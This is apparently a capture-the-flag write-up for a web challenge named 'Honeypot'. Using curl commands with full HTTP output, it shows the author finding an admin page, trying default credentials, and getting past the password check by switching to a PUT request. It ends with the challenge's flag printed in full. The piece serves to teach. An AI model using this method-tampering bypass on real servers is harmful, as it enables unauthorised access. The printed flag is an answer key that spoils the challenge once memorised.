# Honeypot

## Description
```
Access the admin page to get the flag, but don't get into the honeypot and don't dig too deep =)
```

## Writeup

Starting off I send a request to the provided IP. <br/>
```sh
kali@kali curl -v -X GET http://62.173.140.174:36004/     
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 62.173.140.174:36004...
* Connected to 62.173.140.174 (62.173.140.174) port 36004 (#0)
> GET / HTTP/1.1
> Host: 62.173.140.174:36004
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.10.12
< Date: Sat, 11 Nov 2023 13:24:15 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 70
< Connection: close
< 
* Closing connection 0
Чтобы получить флаг войдите в админку.
```

This translates to `To get the flag log in to the admin area`. <br/>
After a quick `ffuf` directory scan we get `/admin`. <br/>
```sh
kali@kali curl -v -X GET http://62.173.140.174:36004/admin
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 62.173.140.174:36004...
* Connected to 62.173.140.174 (62.173.140.174) port 36004 (#0)
> GET /admin HTTP/1.1
> Host: 62.173.140.174:36004
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.10.12
< Date: Sat, 11 Nov 2023 13:24:08 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 192
< Connection: close
< 
* Closing connection 0
Введите пароль, чтобы попасть на страницу администратора: <br><br><form method="POST" action="/admin"><input placeholder="пароль"></form>
```

This translates to `Enter your password to access the administrator page`. <br/>
Sending a POST request as intended by the html code. <br/>
```sh
kali@kali curl -v -X POST http://62.173.140.174:36004/admin  
*   Trying 62.173.140.174:36004...
* Connected to 62.173.140.174 (62.173.140.174) port 36004 (#0)
> POST /admin HTTP/1.1
> Host: 62.173.140.174:36004
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.10.12
< Date: Sat, 11 Nov 2023 13:22:08 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 94
< Connection: close
< 
* Closing connection 0
Неверный пароль! К сожалению, пароль неправильный =(
```

This translates to `Wrong password! Unfortunately, the password is wrong =(`. <br/>
Gettign this response I passed a payload with basic credentials. <br/>
```sh
kali@kali curl -v -u admin:admin -X POST http://62.173.140.174:36004/admin
*   Trying 62.173.140.174:36004...
* Connected to 62.173.140.174 (62.173.140.174) port 36004 (#0)
* Server auth using Basic with user 'admin'
> POST /admin HTTP/1.1
> Host: 62.173.140.174:36004
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.10.12
< Date: Sat, 11 Nov 2023 13:27:16 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 94
< Connection: close
< 
* Closing connection 0
Неверный пароль! К сожалению, пароль неправильный =(
```

Seems like this doesn't change a thing. <br/>
Knowing this won't work I tried different methods. <br/>
```sh
kali@kali curl -v -X PUT http://62.173.140.174:36004/admin
*   Trying 62.173.140.174:36004...
* Connected to 62.173.140.174 (62.173.140.174) port 36004 (#0)
> PUT /admin HTTP/1.1
> Host: 62.173.140.174:36004
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.1 Python/3.10.12
< Date: Sat, 11 Nov 2023 13:22:43 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 136
< Connection: close
< 
* Closing connection 0
Добро пожаловать на страницу админа. Забирай свой флаг - CODEBY{put_http_m3th0d_f0r_p4ss}!
```

This translates to `Welcome to the admin page. Take your flag`. <br/>
Seems like we finished this challenge. 



